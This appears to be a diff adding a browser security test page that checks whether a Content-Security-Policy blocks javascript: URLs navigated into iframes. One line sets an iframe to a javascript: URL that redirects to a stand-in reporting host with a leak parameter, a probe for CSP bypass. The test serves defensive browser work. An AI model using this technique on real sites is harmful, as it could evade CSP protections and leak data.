@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-whitelist'">
+<body>
+  Setting location with <code>iframe.contentWindow.location.href</code><br/>
+  <iframe id="iframe_href" src="https://leak.test/CSP/c909865/helper"></iframe>
+  <hr>
+  Setting location with <code>iframe.src</code><br/>
+  <iframe id="iframe_src" src="https://leak.test/CSP/c909865/helper"></iframe>
+  <script nonce="whitelist">
+    const iframeHref = document.querySelector("#iframe_href");
+    iframeHref.addEventListener('load', () => {
+      iframeHref.contentWindow.location.href = "javascript:(document.location='https://a.test/report/?leak=c909865')";
+    });
+    const iframeSrc = document.querySelector("#iframe_src");
+    iframeSrc.addEventListener('load', () => {
+      iframeSrc.src = "javascript:'SUCCESS (JS URL blocked)'";
+    });
+  </script>
+</body>
